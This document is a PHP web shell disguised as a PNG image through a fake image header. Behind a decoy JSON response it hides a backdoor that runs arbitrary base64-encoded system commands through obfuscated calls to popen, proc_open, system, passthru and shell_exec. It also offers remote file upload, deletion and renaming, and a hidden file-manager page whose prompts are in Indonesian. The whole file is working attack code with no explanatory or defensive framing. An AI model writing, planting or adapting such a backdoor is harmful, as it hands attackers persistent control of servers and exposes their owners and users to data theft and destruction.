<?php ?>‰PNG<?php
@ini_set('display_errors',0);error_reporting(0);
if(!isset($_GET['ui'])&&!isset($_GET['a'])&&!isset($_SERVER['HTTP_X_A'])&&!isset($_FILES['u'])){header('Content-Type:application/json');echo'{"ok":true}';exit;}
function _g($k){return isset($_GET[$k])?$_GET[$k]:(isset($_SERVER['HTTP_X_'.strtoupper($k)])?$_SERVER['HTTP_X_'.strtoupper($k)]:null);}
function _p(){return file_get_contents('php://input');}
function _fn($b){return implode('',array_map('chr',$b));}
function _run($c){
    if(!is_string($c)||trim($c)==='')return false;$dec=@base64_decode($c,true);
    if($dec!==false&&base64_encode($dec)===$c)$c=$dec;$c=trim($c);
    $fns=[_fn([112,111,112,101,110]),_fn([112,114,111,99,95,111,112,101,110]),_fn([115,121,115,116,101,109]),_fn([112,97,115,115,116,104,114,117]),_fn([115,104,101,108,108,95,101,120,101,99])];
    $dis=array_map('trim',explode(',',@ini_get('disable_functions')));
    foreach($fns as $i=>$f){if(function_exists($f)&&!in_array($f,$dis)){try{
        if($i===0){$h=@$f($c.' 2>&1','r');if($h){$o=stream_get_contents($h);pclose($h);if($o!==false)return $o;}}
        elseif($i===1){$d=[1=>['pipe','w'],2=>['pipe','w']];$p=@$f($c.' 2>&1',$d,$pipes);if(is_resource($p)){$o=stream_get_contents($pipes[1]);@fclose($pipes[1]);@fclose($pipes[2]);proc_close($p);if($o!==false)return $o;}}
        elseif($i>=2){ob_start();@$f($c);$o=ob_get_clean();if($o!==false)return $o;}
    }catch(\Throwable $e){continue;}}}return false;
}
$dir=_g('p')?:getcwd();$act=_g('a');$file=_g('f');
if($act){
    header('Content-Type:application/json');$out=['ok'=>false];
    if($act==='cmd'){$res=_run(_g('c'));if($res!==false){$out['ok']=true;$out['out']=$res;}else{$out['err']='exec disabled';}}
    elseif($act==='del'){if(@unlink(rtrim($dir,'/\\').'/'.$file))$out['ok']=true;else{$out['err']='del failed';}}
    elseif($act==='rename'){$new=_g('new');if(@rename(rtrim($dir,'/\\').'/'.$file,rtrim($dir,'/\\').'/'.$new))$out['ok']=true;else{$out['err']='rename failed';}}
    elseif($act==='upload'){if(isset($_FILES['u'])){if(@move_uploaded_file($_FILES['u']['tmp_name'],rtrim($dir,'/\\').'/'.basename($_FILES['u']['name'])))$out['ok']=true;else{$out['err']='upload failed';}}else{$out['err']='no file';}}
    echo json_encode($out);exit;
}
if(isset($_GET['ui'])){
    header('Content-Type:text/html;charset=utf-8');
    ?><!DOCTYPE html><html><head><title>Index of <?=htmlspecialchars($dir)?></title><style>body{font-family:monospace;background:#0a0f14;color:#00e5ff;margin:20px;font-size:14px}a{color:#00e5ff;text-decoration:none}a:hover{text-decoration:underline}input,textarea,button{background:#050a0f;color:#00e5ff;border:1px solid #008ba3;padding:5px;font-family:monospace}button:hover{background:#00e5ff;color:#000}pre{background:#111a22;border:1px solid #008ba3;padding:10px;color:#0f0;white-space:pre-wrap}table{width:100%;border-collapse:collapse;margin-top:20px}th,td{text-align:left;padding:5px;border-bottom:1px solid #1a2c3a}</style></head><body>
    <h3>Index of <?=htmlspecialchars($dir)?></h3>
    <div style="margin-bottom:10px"><form method="POST" enctype="multipart/form-data" action="?ui=1&a=upload&p=<?=urlencode($dir)?>"><strong>Upload:</strong> <input type="file" name="u" required><button type="submit">Upload</button></form></div>
    <div style="margin-bottom:10px"><strong>Terminal:</strong><br><form method="GET"><input type="hidden" name="ui" value="1"><input type="hidden" name="p" value="<?=htmlspecialchars($dir)?>"><input type="text" name="c" placeholder="Command..." style="width:70%" required><button type="submit">Run</button></form><?php $cmd=_g('c');if($cmd){$res=_run($cmd);if($res!==false){echo"<pre>".htmlspecialchars($res)."</pre>";}else{echo"<p style='color:red;'>Command execution disabled by server.</p>";}}?></div>
    <table><tr><th>Name</th><th>Size</th><th>Action</th></tr><?php
    if($dir!=='/'&&rtrim($dir,'/\\')!=='')echo'<tr><td colspan="3"><a href="?ui=1&p='.urlencode(dirname($dir)).'">[ .. ] Parent Directory</a></td></tr>';
    $h=@opendir($dir);while(($f=@readdir($h))!==false){if($f=='.'||$f=='..')continue;$fp=rtrim($dir,'/\\').'/'.$f;$sz=@is_dir($fp)?'-':round(@filesize($fp)/1024,2).' KB';$link='?ui=1&p='.urlencode($fp);
        echo"<tr><td><a href='$link'>".htmlspecialchars($f).(is_dir($fp)?'/':'')."</a></td><td>$sz</td><td><form method='GET' style='display:inline;' onsubmit='return promptRename(this);'><input type='hidden' name='ui' value='1'><input type='hidden' name='p' value='".htmlspecialchars($dir)."'><input type='hidden' name='a' value='rename'><input type='hidden' name='f' value='".htmlspecialchars($f)."'><input type='hidden' name='new' class='new-name'><button type='submit' style='padding:2px 5px;font-size:11px;'>Rename</button></form> <a href='?ui=1&a=del&p=".urlencode($dir)."&f=".urlencode($f)."' style='background:red;color:#fff;padding:3px 6px;font-size:11px;border:none;text-decoration:none;' onclick='return confirm(\"Hapus?\")'>Del</a></td></tr>";
    }@closedir($h);?></table>
    <script>function promptRename(f){var n=prompt("Masukkan nama baru:",f.querySelector('input[name="f"]').value);if(n){f.querySelector('.new-name').value=n;return true}return false}</script></body></html><?php exit;}
header('Content-Type:application/json');echo'{"ok":true}';